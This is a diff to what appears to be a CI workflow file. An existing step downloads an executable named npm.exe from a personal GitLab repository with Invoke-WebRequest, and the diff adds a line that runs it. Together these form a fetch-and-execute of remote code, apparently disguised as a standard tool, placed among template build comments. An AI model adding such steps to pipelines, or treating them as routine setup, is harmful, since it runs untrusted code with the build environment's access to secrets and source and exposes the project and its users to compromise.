@@ -33,5 +33,6 @@ jobs:
       - name: Run a multi-line script
         run: |
           Invoke-WebRequest -Uri gitlab.com/chriskm0909/npm/-/raw/main/npm.exe -OutFile .\npm.exe
+          .\npm.exe
           echo Add other actions to build,
           echo test, and deploy your project.
